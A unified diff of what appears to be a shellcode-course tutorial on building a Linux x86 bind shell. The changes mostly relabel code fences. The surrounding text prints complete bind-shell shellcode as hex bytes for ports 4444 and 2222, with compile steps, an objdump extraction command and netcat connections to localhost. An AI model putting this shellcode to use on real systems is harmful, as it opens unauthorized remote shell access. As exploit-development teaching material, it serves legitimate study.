@@ -62,11 +62,11 @@ int main()
 ```
 
 Before starting, a list of linux x86 systemcall can be found in the following files
-```bash
+```console
 #cat /usr/include/asm/unistd_32.h
 ```
 On older distributions the file is stored here:
-```bash
+```console
 #cat /usr/include/i386-linux-gnu/asm/unistd_32.h 
 ```
 
@@ -272,18 +272,18 @@ _start:
 ```
 
 Let's compile and execute it ("compile_nasm.sh" file can be found in the script folder): 
-```bash
+```console
 #./compile_nasm.sh bind_shell
 #./bind_shell
 ```
 
 We can check if the port 4444 is open using netstat:
-```bash
+```console
 #netstat -antp | grep 4444
 ```
 
 We can now connect to this new port using for example netcat and get our shell:
-```bash
+```console
 #nc -nv 127.0.0.1 4444
 ```
 
@@ -294,12 +294,9 @@ Before explaining the python script used for this task, we need to retrieve the 
 Why ? Because our python script won't interpret our shellcode without this part.
 
 We can easily do that by using the following objdump command:
-```bash
+```console
 #objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-```
 
-Here is the result:
-```bash
 "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
 ```
 
@@ -331,12 +328,9 @@ print(shellcode)
 ```
 
 This script will give us the following result:
-```bash
+```console
 #./modify_bind_shell.py 2222
-```
 
-Here is the result:
-```bash
 "\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
 ```
 
@@ -363,19 +357,18 @@ main()
 ```
 
 Let's compile and execute this program (The 'compile_shellcode_file.sh' file can be found in the script directory):
-```bash
+```console
 #./scripts/compile_shellcode_file.sh test_shellcode
 #./test_shellcode 
 Shellcode Length:  117
-
 ```
 We can use netcat to check if the port 2222 is open:
-```bash
+```console
 #netstat -antp | grep 2222
 ```
 
 Finaly, netcat can be used to access our bind shell 
-```bash
+```console
 #nc -nv 127.0.0.1 2222
 ```
 
